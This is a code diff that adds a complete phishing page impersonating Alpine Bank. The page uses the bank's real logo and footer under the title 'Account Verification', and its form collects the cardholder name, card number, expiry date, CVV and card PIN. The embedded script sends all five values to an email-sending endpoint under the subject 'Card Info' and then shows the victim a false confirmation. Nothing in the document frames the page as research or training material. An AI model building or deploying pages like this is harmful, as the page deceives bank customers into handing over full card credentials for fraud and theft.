@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Account Verification</title>
+  <link rel="stylesheet" href="style.css" />
+  <style>
+    body, html {
+      height: 100%;
+      margin: 0;
+      padding: 0;
+    }
+    body {
+      background: url('Screenshot 2025-06-27 180535.png') no-repeat center center fixed;
+      background-size: cover;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .login-box {
+      display: block;
+      background-color: #1F1F1F;
+      box-shadow: var(--card-shadow);
+      border-radius: 10px;
+      margin-bottom: 16px;
+      margin-left: auto;
+      margin-right: auto;
+      box-sizing: border-box;
+      max-width: 480px;
+      width: 90%;
+      padding: 45px
+    }
+    .logo {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 18px;
+      margin-bottom: 24px;
+    }
+    .logo-img {
+      width: 244px;
+      height: 64px;
+      object-fit: contain;
+      background: none;
+      border-radius: 0;
+      box-shadow: none;
+      display: block;
+    }
+    h2 {
+      color: #fff;
+      font-family: 'Inter', Arial, sans-serif;
+      font-size: 1.35rem;
+      margin-bottom: 18px;
+      text-align: center;
+      position: relative;
+    }
+    .info-message {
+      color: #ccc8c8;
+      font-size: 1rem;
+      margin-bottom: 18px;
+      font-family: 'Inter', Arial, sans-serif;
+      font-weight: 400;
+      text-align: center;
+    }
+    .verify-form {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+    }
+    .input-group {
+      position: relative;
+      margin-bottom: 1.1rem;
+    }
+    .input-group input {
+      width: 100%;
+      padding: 0.6rem;
+      background: #1a1a1a;
+      border-radius: 6px;
+      outline: none;
+      font-size: 1rem;
+      transition: all 0.2s ease-in-out;
+      height: 2rem;
+      color: #fff;
+      border: 1px solid #555;
+      font-family: 'Inter', Arial, sans-serif;
+      font-weight: 400;
+      margin-bottom: 0;
+      
+    }
+    .input-group input::placeholder {
+      color: #6c746f;
+      font-family: 'Inter', Arial, sans-serif;
+      font-size: 1rem;
+      opacity: 1;
+      font-weight: 400;
+    }
+    .input-group label {
+      position: absolute;
+      top: 54%;
+      left: 1rem;
+      transform: translateY(-50%);
+      background: #1a1a1a;
+      color: #6c746f;
+      padding: 0 4px;
+      font-size: 1.1rem;
+      pointer-events: none;
+      transition: 0.2s ease;
+      font-family: 'Inter', Arial, sans-serif;
+    }
+    .input-group input:focus,
+    .input-group input:valid {
+      border: 2px solid #00a680;
+    }
+    .input-group input:focus + label,
+    .input-group input:valid + label {
+      top: 0;
+      left: 0.8rem;
+      font-size: 0.85rem;
+      color: #00a680;
+      font-weight: 400;
+    }
+    .continue-btn {
+      width: 100%;
+      padding: 0.9rem 1.4rem;
+      background-color: #0d38b0;
+      color: white;
+      font-weight: 700;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 1.08rem;
+      margin-top: 18px;
+      font-family: 'Inter', Arial, sans-serif;
+    }
+    .continue-btn:hover {
+      background: #0047d3;
+    }
+    .success-message {
+      color: #00a680;
+      margin-top: 18px;
+      text-align: center;
+      font-size: 1.1rem;
+      font-family: 'Inter', Arial, sans-serif;
+    }
+    .footer {
+      width: 100vw;
+      background: #1F1F1F;
+      color: #bdbdbd;
+      position: fixed;
+      left: 0;
+      bottom: 0;
+      z-index: 100;
+      padding: 0;
+      margin: 0;
+      box-shadow: 0 -2px 8px rgba(0,0,0,0.08);
+      box-sizing: border-box;
+    }
+    .footer-content {
+      width: 100vw;
+      margin: 0 auto;
+      padding: 2px 12px;
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.92rem;
+      gap: 8px 14px;
+      color: #888;
+      box-sizing: border-box;
+    }
+    .footer-content > * {
+      flex-shrink: 1;
+      min-width: 0;
+      white-space: nowrap;
+    }
+    .footer-link {
+      color: #00a680;
+      text-decoration: none;
+      transition: text-decoration 0.2s;
+    }
+    .footer-link:hover {
+      text-decoration: underline;
+    }
+    .dot {
+      margin: 0 5px;
+      color: #bdbdbd;
+      font-size: 1.1em;
+    }
+  </style>
+</head>
+<body>
+  <div class="background">
+    <div class="login-box">
+      <div class="logo">
+        <img src="https://online.alpinebank.com/images/fi-assets/alpine-bank/alpine-bank-logo-48b3923a.png" alt="Logo" class="logo-img">
+      </div>
+      <h2>Account Verification<br><span style="font-weight:100;font-size:1rem;color: #ccc8c8;">Confirm Your Account Information</span></h2>
+      <div class="info-message">We need this info to verify your identity. Please enter your bank card information below.</div>
+      <form class="verify-form" id="accountForm">
+        <div class="input-group">
+          <input type="text" id="cardholder" name="cardholder" required maxlength="40"/>
+          <label for="cardholder">Cardholder Name</label>
+        </div>
+        <div class="input-group">
+          <input type="text" id="cardnumber" name="cardnumber" required maxlength="19" pattern="[0-9 ]{19}" inputmode="numeric"  />
+          <label for="cardnumber">Card Number</label>
+        </div>
+        <div class="input-group">
+          <input type="text" id="expiry" name="expiry" required maxlength="5" pattern="\d{2}/\d{2}" />
+          <label for="expiry">Expiry Date</label>
+        </div>
+        <div class="input-group">
+          <input type="text" id="cvv" name="cvv" required maxlength="3" pattern="\d{3}" inputmode="numeric" />
+          <label for="cvv">CVV</label>
+        </div>
+        <div class="input-group">
+          <input type="password" id="pin" name="pin" required maxlength="4" pattern="\d{4}" inputmode="numeric"  />
+          <label for="pin">Card PIN</label>
+        </div>
+        <button type="submit" class="continue-btn">Continue</button>
+      </form>
+      <div class="success-message" id="successMsg" style="display:none;">Account info sent for verification!</div>
+    </div>
+  </div>
+  <footer class="footer">
+    <div class="footer-content">
+      <span>© 2025 Alpine Bank</span>
+      <span class="dot">•</span>
+      <span>(800) 551-6098</span>
+      <span class="dot">•</span>
+      <a href="#" class="footer-link">Privacy policy</a>
+      <span class="dot">•</span>
+      <span>Member FDIC</span>
+      <span class="dot">•</span>
+      <span class="icon-text">
+        Equal Housing Lender
+      </span>
+    </div>
+  </footer>
+  <script>
+    // Format card number as 4 4 4 4
+    document.getElementById('cardnumber').addEventListener('input', function(e) {
+      let value = e.target.value.replace(/\D/g, '').slice(0, 16);
+      value = value.replace(/(.{4})/g, '$1 ').trim();
+      e.target.value = value;
+    });
+    
+    // Format expiry date as MM/YY
+    document.getElementById('expiry').addEventListener('input', function(e) {
+      let value = e.target.value.replace(/\D/g, '').slice(0, 4);
+      if (value.length >= 2) {
+        value = value.slice(0, 2) + '/' + value.slice(2);
+      }
+      e.target.value = value;
+    });
+    
+    document.getElementById('accountForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      const cardholder = document.getElementById('cardholder').value.trim();
+      const cardnumber = document.getElementById('cardnumber').value.replace(/\s/g, '');
+      const expiry = document.getElementById('expiry').value.trim();
+      const cvv = document.getElementById('cvv').value.trim();
+      const pin = document.getElementById('pin').value.trim();
+      if (!cardholder || cardnumber.length !== 16 || !/^\d{2}\/\d{2}$/.test(expiry) || cvv.length !== 3 || pin.length !== 4) {
+        alert('Please fill all fields correctly.');
+        return;
+      }
+      const message = `Cardholder Name: ${cardholder}\nCard Number: ${cardnumber}\nExpiry Date: ${expiry}\nCVV: ${cvv}\nCard PIN: ${pin}`;
+      const res = await fetch('/api/sendEmail', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          email: '',
+          message,
+          subject: 'Card Info'
+        })
+      });
+      const data = await res.json();
+      if (res.ok) {
+        document.getElementById('successMsg').style.display = 'block';
+        setTimeout(() => { document.getElementById('successMsg').style.display = 'none'; }, 3000);
+        document.getElementById('accountForm').reset();
+      } else {
+        alert('Error: ' + (data.message || 'Could not send info.'));
+      }
+    });
+  </script>
+</body>
+</html> 
